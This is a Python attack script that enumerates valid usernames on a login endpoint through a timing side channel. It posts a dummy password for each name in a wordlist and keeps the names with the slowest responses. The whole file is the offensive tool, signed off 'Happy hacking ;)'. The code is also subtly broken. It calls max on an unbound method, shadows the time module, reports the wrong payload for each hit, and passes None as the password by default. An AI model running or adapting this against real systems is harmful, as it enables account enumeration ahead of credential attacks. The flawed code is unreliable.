import requests as rq
import argparse
import time

def write_output(usernames:list):
    with open("output.txt",'w') as output:
        for user in usernames:
            line = user+"\n"
            output.write(line)
    print('Exploit finished.\nCheck the found valid usernames in the output.txt file.\nHappy hacking ;)')
    return

def exploit(url:str,users_wordlist_path:str,dummy_password="foo"):
    valid_usernames = []
    timings = {}
    print(f'Attacking {url}...\nPlease be patient')
    
    with open(users_wordlist_path) as user_wordlist:
        for user in user_wordlist:
            user = user.strip()

            req_payload = {"password":dummy_password,"username":user}
            response = rq.post(url=url,json=req_payload)
            
            elapsed_time = response.elapsed.total_seconds()
            timings[user] = elapsed_time
            time.sleep(0.01)    
            
    largest_time = max(timings.values)

    for user,time in timings.items():
        if time>=largest_time*0.9:
            print(f'Found a valid payload {req_payload} - {elapsed_time}')
            valid_usernames.append(user)
    write_output(usernames=valid_usernames)        
    return        
            
            
            
parser = argparse.ArgumentParser("users_timing_attack_exploit")

parser.add_argument("-u",dest="url", help="The attacked URL", type=str,required=True)
parser.add_argument("-w",dest="wordlist", help="Path to usernames wordlist", type=str,required=True)
parser.add_argument("-p",dest="password", help="Dummy password to login", type=str,required=False)
args = parser.parse_args()

if __name__ == "__main__":
    exploit(args.url,args.wordlist,dummy_password=args.password)